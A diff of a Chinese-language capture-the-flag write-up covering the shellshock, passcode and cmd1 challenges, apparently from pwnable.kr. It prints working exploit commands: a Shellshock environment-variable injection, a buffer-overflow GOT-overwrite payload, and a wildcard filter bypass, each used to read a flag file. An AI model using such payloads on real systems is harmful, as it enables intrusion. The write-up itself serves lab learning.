@@ -30,14 +30,18 @@ env x='() { return;}; /bin/cat flag' ./shellshock }'' }'
 
 ### passcode
 找到兩個scanf在stack的offset
-(ebp – 0x10) – (ebp – 0x70) = 0x60 = 96
+
+"(ebp – 0x10) – (ebp – 0x70) = 0x60 = 96"
+
 第一個scanf參數位置0xbffff3c8
 第二個scanf參數位置0xbffff428
+
 把剛剛取得的printf或fflush GOT位置寫入(%s)
 再把system("/bin/cat flag")位置寫入(%d)
-0x80485E3 -> 134514147
+
+"0x80485E3 -> 134514147"
 最後送出Payload是
-python -c "print 'A'*96+'\x00\xa0\x04\x08'+'134514147\n'" | ./passcode
+"python -c "print 'A'*96+'\x00\xa0\x04\x08'+'134514147\n'" | ./passcode"
 
 ### cmd1
 ./cmd1 "/bin/cat f*"
